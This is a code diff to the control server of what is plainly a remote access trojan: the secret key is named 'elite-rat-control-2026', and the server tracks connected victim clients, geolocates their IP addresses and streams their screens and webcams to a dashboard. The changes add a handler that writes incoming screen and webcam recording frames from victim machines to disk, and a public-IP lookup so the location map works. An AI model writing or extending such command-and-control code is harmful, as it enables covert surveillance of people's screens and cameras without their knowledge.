@@ -8,6 +8,11 @@ from datetime import datetime
 import threading
 from collections import defaultdict
 
+# Ensure recordings directory exists
+REC_DIR = 'recordings'
+if not os.path.exists(REC_DIR):
+    os.makedirs(REC_DIR)
+
 app = Flask(__name__, template_folder='templates')
 app.config['SECRET_KEY'] = 'elite-rat-control-2026'
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
@@ -43,7 +48,13 @@ def api_clients():
 def get_location(client_id):
     if client_id in clients:
         ip = clients[client_id]['ip']
-        if ip == '127.0.0.1': return jsonify({'city': 'Localhost', 'country': 'Internal'})
+        # If testing locally, fetch public IP for Map to work
+        if ip == '127.0.0.1':
+            try:
+                import requests
+                ip = requests.get("https://api.ipify.org", timeout=5).text
+            except: pass
+        
         try:
             import requests
             r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
@@ -155,6 +166,19 @@ def screen_data(data):
             'client_id': client_id,
             'image': data['image']
         }, room='dashboard')
+
+@socketio.on('save_record')
+def handle_save_record(data):
+    """Save incoming recording frames to the server's disk."""
+    client_id = data.get('client_id')
+    rec_type = data.get('type', 'screen')
+    chunk = data.get('data')
+    if client_id and chunk:
+        try:
+            filename = f"rec_{client_id}_{rec_type}.dat"
+            with open(os.path.join(REC_DIR, filename), "ab") as f:
+                f.write(base64.b64decode(chunk))
+        except: pass
 
 @socketio.on('webcam_data')
 def webcam_data(data):
